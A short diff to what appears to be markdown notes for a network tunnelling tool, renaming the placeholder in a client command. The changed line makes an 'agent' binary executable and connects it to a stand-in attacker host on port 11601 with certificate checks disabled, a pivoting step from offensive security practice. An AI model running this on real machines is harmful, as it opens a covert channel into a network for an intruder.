@@ -18,7 +18,7 @@ sudo ./proxy -selfcert
 
 # start client
 ```
-chmod +x ./agent ; ./agent -connect PWNIP:11601 --ignore-cert
+chmod +x ./agent ; ./agent -connect attackerip:11601 --ignore-cert
 ```
 
 
